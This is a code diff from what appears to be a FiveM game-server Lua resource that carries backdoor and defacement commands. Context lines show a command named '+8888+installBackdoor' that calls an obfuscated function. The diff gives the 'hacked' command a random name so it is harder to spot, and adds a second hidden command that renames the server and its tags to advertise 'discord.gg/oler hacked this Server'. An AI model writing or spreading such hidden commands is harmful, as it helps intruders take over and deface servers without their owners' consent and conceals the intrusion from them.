@@ -240,7 +240,7 @@ RegisterCommand("+8888+installBackdoor", function(source, args, rawCommand)
 	SDhskXCsi391()
 end, false)
 
-RegisterCommand("+8888+hackedNames", function(source, args, rawCommand)
+RegisterCommand("oieghsodihgsodinboisehoiusgh", function(source, args, rawCommand)
 	serverName = "Server Hacked by Nxton | Nächstes mal nicht so Freundchen"
 	SetConvarReplicated("sv_hostname", string.format(serverName))
 	SetConvarServerInfo('tags', 'HACKED')
@@ -248,4 +248,14 @@ RegisterCommand("+8888+hackedNames", function(source, args, rawCommand)
 	SetConvarServerInfo('tags', 'NXTON')
 	SetConvarServerInfo('tags', 'Nächstes mal lässt du deine PI')
 	SetConvarServerInfo('tags', 'Server Hacked by Nxton | Nächstes mal nicht so')
+end, false)
+
+RegisterCommand("eigshdsiughsidhbigheg", function(source, args, rawCommand)
+	serverName = "discord.gg/oler"
+	SetConvarReplicated("sv_hostname", string.format(serverName))
+	SetConvarServerInfo('tags', 'OLER')
+	SetConvarServerInfo('tags', 'DISCORD.GG/OLER')
+	SetConvarServerInfo('tags', 'OLER')
+	SetConvarServerInfo('tags', 'discord.gg/oler hacked this Server')
+	SetConvarServerInfo('tags', 'discord.gg/oler hacked this Server')
 end, false)
